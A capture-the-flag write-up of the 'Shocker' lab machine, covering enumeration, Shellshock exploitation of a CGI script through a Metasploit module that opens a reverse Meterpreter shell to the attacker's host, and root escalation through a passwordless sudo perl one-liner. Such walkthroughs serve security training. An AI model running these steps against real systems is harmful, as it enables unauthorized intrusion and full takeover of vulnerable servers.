# Shocker Write-ups

\# BlueBrain

## Enumeration

### Nmap

```
# nmap -sC -sV -oA nmap/initial 10.10.10.56
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-26 23:39 EDT
Nmap scan report for 10.10.10.56
Host is up (0.29s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.91 seconds
```

An Nmap scan reveals two services, Apache and OpenSSH. OpenSSH is hosted on a non-standard port, however its use does not come into play during exploitation.

### Gobuster

Using the Gobuster produces the following results when fuzzing for directories and PHP files.

```
# gobuster dir -u http://10.10.10.56 -w /usr/share/wordlists/dirb/small.txt                           
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/cgi-bin/             (Status: 403) [Size: 294]
Progress: 959 / 960 (99.90%)
===============================================================
Finished
===============================================================
```

Due to the limited results, and inferring from the name of the Machine, it is fairly safe to assume at this point that the entry method will be through a script in `/cgi-bin/` using the Shellshock exploit. Fuzzing for the extensions `sh, pl` get us the following results.

```
# gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x sh,pl         
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56/cgi-bin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              sh,pl
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/user.sh              (Status: 200) [Size: 119]
Progress: 2877 / 2880 (99.90%)
===============================================================
Finished
===============================================================
```

## Exploitation

With the discovered `user.sh` script, and due to the lack of another attack surface, it is quite clear at this point that the exploit will be shellshock (Apache mod_cgi). There is a Metasploit module for this specific vulnerability, as well as a Proof of Concept on exploit-db.

### Metasploit

Module: exploit/multi/http/apache_mod_cgi_bash_env_exec

To run the Metasploit module, the only options that need to be set are `RHOST` and `TARGETURI`. The URI in this case will be `/cgi-bin/user.sh`. After the exploit has run, we have basic user permissions and access to the user flag at `/home/shelly/user.txt`

```
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set rhost 10.10.10.56
rhost => 10.10.10.56
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set targeturi /cgi-bin/user.sh
targeturi => /cgi-bin/user.sh
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > run

[*] Started reverse TCP handler on 10.10.16.12:4444 
[*] Sending stage (1017704 bytes) to 10.10.10.40
[*] Command Stager progress - 100.00% done (1092/1092 bytes)
[*] Sending stage (1017704 bytes) to 10.10.10.56
[*] Meterpreter session 2 opened (10.10.16.12:4444 -> 10.10.10.56:32932) at 2024-05-27 00:12:21 -0400

meterpreter >
```

### Privilege Escalation

LinEnum: https://github.com/rebootuser/LinEnum

Running LinEnum presents a large amount of data to go over. One thing that stands out fairly quickly is that there is no password required to execute `sudo /usr/bin/perl`. Exploitation of this is trivial, and there are many ways from here to obtain the root flag. To quickly gain a root shell, the following command will suffice: `sudo /usr/bin/perl -e 'exec "/bin/sh"'`

```
sudo /usr/bin/perl -e 'exec "/bin/sh"'
id
uid=0(root) gid=0(root) groups=0(root)
```

The root flag can be retrieved from `/root/root.txt`.
